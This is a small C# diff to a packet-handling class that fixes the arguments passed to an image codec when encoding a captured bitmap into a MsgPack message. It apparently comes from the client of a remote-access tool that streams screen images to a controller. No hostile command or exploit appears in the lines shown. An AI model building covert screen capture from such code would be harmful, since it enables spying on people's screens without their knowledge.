@@ -44,7 +44,8 @@ namespace Client.Handle_Packet
 
                     using (MemoryStream stream = new MemoryStream())
                     {
-                        unsafeCodec.CodeImage(bmpData.Scan0, rect, size, bmp.PixelFormat, stream);
+                        unsafeCodec.CodeImage(bmpData.Scan0, new Rectangle(0, 0, bmpData.Width, bmpData.Height), new Size(bmpData.Width, bmpData.Height), bmpData.PixelFormat, stream);
+
                         if (stream.Length > 0)
                         {
                             MsgPack msgpack = new MsgPack();
